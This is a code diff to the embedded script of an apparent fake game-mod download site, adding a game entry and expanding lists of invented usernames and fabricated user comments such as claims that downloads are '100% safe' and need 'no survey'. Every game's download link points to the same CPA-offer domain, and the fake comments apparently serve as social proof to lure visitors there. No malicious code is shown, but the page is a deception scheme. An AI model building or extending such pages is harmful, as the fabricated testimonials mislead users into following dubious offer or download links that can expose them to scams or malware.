@@ -483,6 +483,7 @@
     <script>
         // ── Data ──
         const GAMES_DATA = [
+            { id: '1', title: 'XenoFeels', category: 'Horror', thumbnail: 'https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4293910/8f717539b3a06244184ecd5d5803e5c17d2a4131/page_bg_raw.jpg?t=1781964788', rating: 4.7, size: '780 MB', version: 'v1.0', cpa: 'https://performingsecurity.downapk.online/cl/i/j77o9j' },
             { id: '1', title: 'Tag After School', category: 'Horror', thumbnail: 'https://tagsafterschool.com/wp-content/uploads/2026/04/Green-light-1024x571-1-768x428.webp', rating: 4.3, size: '280 MB', version: 'v1.4', cpa: 'https://performingsecurity.downapk.online/cl/i/j77o9j' },
             { id: '7', title: 'MotorSlice', category: 'Action', thumbnail: 'https://i0.wp.com/indiegame.com/wp-content/uploads/2026/05/MOTORSLICE-_Logo.png?fit=1024,1024&ssl=1', rating: 4.7, size: '3.1 GB', version: 'v0.5.0.0', cpa: 'https://performingsecurity.downapk.online/cl/i/j77o9j' },
             { id: '2', title: 'Neverness to Everness Mobile Apk', category: 'Casual', thumbnail: 'https://gaming-cdn.com/images/products/20168/orig/neverness-to-everness-playstation-5-playstation-store-cover.jpg?v=1772105288', rating: 4.2, size: '1.1 GB', version: 'v0.9.5', cpa: 'https://performingsecurity.downapk.online/cl/i/j77o9j', isNew: true },
@@ -690,19 +691,62 @@
         };
 
         const NAMES = [
-            "flayboy", "shadow.gamer", "weeb_king", "sarah.xo", 
-            "kira_y", "animefan88", "lucas_g", "chloe.k", 
-            "gamerdude12", "ryujin", "david.k", "itz_chris", "zer0_cool",
-            "luna_moon", "otaku_boy", "waifu_lover", "sammy_x"
+           "flayboy", "shadow.gamer", "weeb_king", "sarah.xo", 
+"kira_y", "animefan88", "lucas_g", "chloe.k", 
+"gamerdude12", "ryujin", "david.k", "itz_chris", "zer0_cool",
+"luna_moon", "otaku_boy", "waifu_lover", "sammy_x",
+"xX_demon_Xx", "v_x_n_o_m", ".glitch.", "cyber_modz",
+"ronin.exe", "tsundere.babe", "toxic_ghost", "k y o t o",
+"akira_drifts", "neon_samurai", "pixel.heart", "shinigami_z",
+"void.walker", "waifu.material", "senpai.notices", "blade_runner",
+"itz_ya_boy", "d a r k n e s s", "astro_girl", "apex_predator",
+"yuzu.kun", "silent_assassin", "blood_moon", "kawaii_desu",
+"phantom_hive", "omega_lul", "draco_mal", "ech0_chamber",
+"levi.ack", "midnight_vibe", "cloud_strife", "g0d_tier",
+"baka_ranger", "suki.xo", "lone_wolf", "venom_spits",
+"aesthetic_goth", "cursed_child", "z_e_n_i_t_h", "mod_father"
         ];
         
         const MESSAGES = [
-            "bro it actually works wtf", "tysm!! been looking for this visual novel everywhere", "finally a working mod fr",
-            "omg it downloaded so fast", "thanks man 🙏", "yooo this is fire 🔥", "works perfectly on ios!",
-            "it took a min but i got it thx", "legit!! W site", "holy sh*t it works on Iphone",
-            "best waifu game ever lmao", "installed without any issues", "finally unlocked everything",
-            "w mods", "goated site fr", "working smooth on my android",
-            "love these anime games man", "yessirrrr", "took like 2 mins max"
+            "bro it actually works wtf",
+"tysm!! been looking for this visual novel everywhere",
+"finally a working mod fr",
+"omg it downloaded so fast",
+"thanks man 🙏",
+"yooo this is fire 🔥",
+"works perfectly on ios!",
+"it took a min but i got it thx",
+"legit!! W site",
+"holy sh*t it works on Iphone",
+"best waifu game ever lmao",
+"installed without any issues",
+"finally unlocked everything",
+"w mods",
+"goated site fr",
+"working smooth on my android",
+"love these anime games man",
+"yessirrrr",
+"took like 2 mins max",
+"bruh I thought this was cap but it actually gave me unlimited coins 😭",
+"no survey bs finally!! W",
+"works perfectly on the new update thx",
+"my anti virus didn't flag it, 100% safe guys",
+"premium choices actually unlocked now let's goooo",
+"how is this even free???",
+"been searching for a working mod for WEEKS tysm",
+"didn't even have to jailbreak my phone 🙏",
+"sheeeeeesh the unlimited gems are crazy",
+"W dev, keep it up",
+"10/10 recommend, just follow the steps",
+"crashed once but then worked fine after reopening",
+"bro doing god's work out here",
+"omg all the scenes are uncensored now W",
+"smooth 60fps on my dusty old samsung lol",
+"shoutout to the creator fr fr",
+"i was skeptical at first but damn it actually loaded",
+"all characters unlocked 🔥🔥🔥",
+"anyone getting an error just clear cache, works flawless after",
+"finally i don't have to pay to win 😂"
         ];
 
         let currentActiveGame = null;
